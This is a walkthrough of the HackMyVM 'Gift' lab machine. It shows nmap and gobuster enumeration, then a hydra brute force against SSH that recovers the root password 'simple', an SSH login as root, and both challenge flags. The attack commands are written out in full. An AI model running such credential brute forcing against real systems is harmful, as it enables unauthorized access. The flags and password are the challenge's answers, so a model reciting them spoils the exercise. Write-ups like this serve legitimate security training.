# Gift - HackMyVM Walkthrough

## Machine Information

| Category         | Value                       |
| ---------------- | --------------------------- |
| Platform         | HackMyVM                    |
| Machine Name     | Gift                        |
| Difficulty       | Easy                        |
| Operating System | Linux (Arch Based)          |
| Objective        | Capture User and Root Flags |

---

# Reconnaissance

Starting with the target machine IP address.

```text
192.168.56.121
```

![image alt]()

---

## Initial Nmap Scan

As usual, we begin with a full TCP port scan to identify exposed services.

```bash
nmap -p- --min-rate 5000 -T4 192.168.56.121
```

### Results

```text
Nmap scan report for 192.168.56.121
Host is up (0.000096s latency).

Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two services are exposed:

* SSH (22)
* HTTP (80)

![image alt]()

---

## Service Enumeration

Next, perform service and version detection.

```bash
nmap -sCV -p22,80 192.168.56.121
```

### Results

```text
Nmap scan report for 192.168.56.121

PORT   STATE SERVICE VERSION

22/tcp open  ssh OpenSSH 8.3 (protocol 2.0)

80/tcp open  http nginx

http-methods:
Supported Methods: GET HEAD
```

### Observations

* OpenSSH 8.3
* Nginx web server
* Only GET and HEAD methods enabled
* No obvious web technologies exposed
* No virtual hosts identified

At first glance, the attack surface appears very small.

![image alt]()

---

# Web Enumeration

Let's start by browsing the web application using Burp Suite and Burp Browser.

Navigating to:

```text
http://192.168.56.121
```

reveals a very simple page.

The page contains only the message:

```text
It's really easy. Don't overthink it.
```

Interesting.

Sometimes challenge authors intentionally provide hints directly on the homepage.

At this stage there is no functionality, login form, or obvious attack vector.

![image alt]()

---

# Directory Enumeration

Even when the website appears simple, it is always worth performing content discovery.

Using Gobuster:

```bash
gobuster dir \
-u http://192.168.56.121/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

### Results

```text
===============================================================
Gobuster v3.8.2
===============================================================

Progress: 62281 / 62281 (100.00%)

Finished
===============================================================
```

No directories or files were discovered.

### Observations

* No hidden directories
* No hidden files
* No admin panel
* No backup files
* No upload functionality

The website truly appears minimal.

At this point, the hint becomes important:

```text
Don't overthink it.
```

![image alt]()

---

# SSH Enumeration

Since the web application provides almost no attack surface and SSH is exposed, the next logical step is to investigate authentication.

For many easy machines, default credentials or weak passwords are sometimes used.

A common username to test on Linux systems is:

```text
root
```

Let's attempt password brute forcing against SSH.

---

## Hydra Brute Force

Command:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.121
```

### Results

```text
[22][ssh] host: 192.168.56.121
login: root
password: simple
```

Success.

Valid credentials discovered:

```text
Username: root
Password: simple
```

![image alt]()

---

# Initial Access

Using the recovered credentials, connect via SSH.

```bash
ssh root@192.168.56.121
```

Password:

```text
simple
```

Authentication succeeds immediately.

Since the account is already root, full system compromise is achieved without requiring privilege escalation.

---

# Flag Enumeration

Listing files in the current directory:

```bash
ls
```

Output:

```text
root.txt
user.txt
```

Both flags are directly accessible.

![image alt]()

---

## User Flag

```bash
cat user.txt
```

Output:

```text
HMV665sXzDS
```

---

## Root Flag

```bash
cat root.txt
```

Output:

```text
HMVtyr543FG
```

---

# Flags

## User

```text
HMV665sXzDS
```

## Root

```text
HMVtyr543FG
```

---

# Attack Path Summary

```text
Nmap Scan
     │
     ▼
Port 22 (SSH)
Port 80 (HTTP)
     │
     ▼
Website Enumeration
     │
     ▼
Hint: "Don't overthink it"
     │
     ▼
Directory Enumeration
     │
     ▼
No Findings
     │
     ▼
SSH Password Attack
     │
     ▼
Hydra Brute Force
     │
     ▼
root:simple
     │
     ▼
SSH Login as root
     │
     ▼
Read User Flag
     │
     ▼
Read Root Flag
```

---

# Key Takeaways

### Enumeration

* Always inspect every exposed service.
* Challenge hints often point directly toward the intended attack path.
* A lack of findings is itself useful information.

### Authentication

* Weak passwords remain one of the most common security issues.
* Exposed SSH services should always be considered during assessments.
* Default or simple credentials can lead directly to complete compromise.

### Lesson Learned

The machine's message was the biggest clue:

```text
It's really easy. Don't overthink it.
```

Rather than spending hours searching for hidden web vulnerabilities, the intended solution was simply identifying weak SSH credentials and logging in as root.

Machine rooted successfully.
